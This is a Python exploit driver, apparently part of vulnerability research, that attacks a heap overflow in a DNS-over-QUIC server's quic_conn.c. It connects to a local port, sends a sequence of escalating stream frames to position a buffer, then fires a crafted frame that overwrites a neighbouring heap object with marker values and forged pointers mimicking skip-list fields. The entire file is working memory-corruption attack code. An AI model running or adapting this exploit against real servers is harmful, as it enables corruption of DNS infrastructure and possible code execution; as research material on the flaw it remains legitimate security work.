#!/usr/bin/env python3
"""Tuned-drift oracle / marker driver for the +6144 neighbour.

Geometry (from quic_conn.c:102-127), with N escalation frames of payload D:
  end  = 8 + N*(D-2)          # memcpy destination = buf+end
  real = end + 2              # realloc(data_length + datalen)
  size = 1200 + N*D
  free = 1192 + 2*N           # max F6 datalen
  neighbour at buf+6144 -> body offset = 6144 - end
Usage: ksl_tuned.py PORT N D F6_DATALEN [MARKER_BODY_OFF [MARKER_HEX]]
"""
import asyncio
import os
import struct
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402


async def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    d = int(sys.argv[3]) if len(sys.argv) > 3 else 1225
    f6 = int(sys.argv[4]) if len(sys.argv) > 4 else 1202
    moff = int(sys.argv[5]) if len(sys.argv) > 5 else -1
    mval = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0x4141414141414141
    coherent = len(sys.argv) > 7 and sys.argv[7] == "coherent"
    end = 8 + n * (d - 2)
    real = end + 2
    slot_body = 6144 - end
    print("[driver] N=%d D=%d F6=%d end=%d real=%d slot_body=%d marker_off=%d"
          % (n, d, f6, end, real, slot_body, moff), flush=True)

    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = poc.ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 1024 * 1024
    cfg.max_stream_data = 1024 * 1024
    async with poc.connect("127.0.0.1", port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        await poc._flush(proto, sid, b"\x00\x00" + b"A" * 6, fin=False)
        for i in range(n):
            marker = bytes((0x40 + (i % 26), 0x41 + (i % 26)))
            await poc._flush(proto, sid, marker + bytes((0x40 + j) & 0xff for j in range(d - 2)), fin=False)
        print("[driver] escalation done", flush=True)

        body = bytearray(b"\x5A" * (f6 - 2))
        if coherent:
            ROOT = 0x7FFFF6907710
            SEARCH = 0x5555555CA5C9
            b = slot_body
            for ksl_off, search, keylen in ((0x48, SEARCH, 16), (0x388, SEARCH, 8)):
                for f in (0x40, 0x48, 0x50):
                    body[b + ksl_off + f:b + ksl_off + f + 8] = struct.pack("<Q", ROOT)
                body[b + ksl_off + 0x58:b + ksl_off + 0x60] = struct.pack("<Q", mval)
                body[b + ksl_off + 0x60:b + ksl_off + 0x68] = struct.pack("<Q", search)
                body[b + ksl_off + 0x68:b + ksl_off + 0x70] = struct.pack("<Q", 1)
                body[b + ksl_off + 0x70:b + ksl_off + 0x78] = struct.pack("<Q", keylen)
                body[b + ksl_off + 0x78:b + ksl_off + 0x80] = struct.pack("<Q", keylen)
            print("[driver] coherent markers at slot1+0xa0 and slot1+0x3e0", flush=True)
        elif moff >= 0:
            body[moff:moff + 8] = struct.pack("<Q", mval)
        await poc._flush(proto, sid, b"\x5A\x5A" + bytes(body), fin=True)
        print("[driver] F6 fired dlen=%d" % f6, flush=True)
        for i in range(4):
            s = proto._quic.get_next_available_stream_id(False)
            await poc._flush(proto, s, b"\x00\x04ping", fin=True)
        await asyncio.sleep(2.0)
    print("[driver] done", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
